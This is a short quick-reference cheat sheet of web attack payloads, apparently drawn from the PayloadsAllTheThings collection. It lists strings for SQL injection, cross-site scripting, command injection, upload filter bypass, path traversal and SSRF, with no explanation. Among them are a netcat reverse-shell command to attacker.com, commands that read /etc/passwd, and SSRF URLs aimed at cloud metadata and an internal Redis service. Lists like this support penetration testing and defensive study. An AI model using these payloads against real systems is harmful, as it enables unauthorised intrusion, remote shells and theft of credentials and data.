# 🎯 PayloadsAllTheThings - Quick Reference

## SQL Injection Payloads
- `' OR '1'='1`
- `' UNION SELECT NULL--`
- `1' AND '1'='1`
- `1' ORDER BY 1--`
- `1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`

## XSS Payloads
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`
- `javascript:alert(1)`

## Command Injection
- `; ls -la`
- `| whoami`
- `&& cat /etc/passwd`
- `$(`id`)`
- `;nc -e /bin/sh attacker.com 4444`

## File Upload Bypass
- `shell.php.jpg`
- `shell.php;.jpg`
- `shell.php%00.jpg`
- `shell.pHp`
- `shell.php5`

## Path Traversal
- `../../../etc/passwd`
- `....//....//....//etc/passwd`
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`

## SSRF Payloads
- `http://169.254.169.254/latest/meta-data/`
- `http://127.0.0.1:8080/`
- `http://localhost:6379/`
- `gopher://127.0.0.1:6379/_INFO`
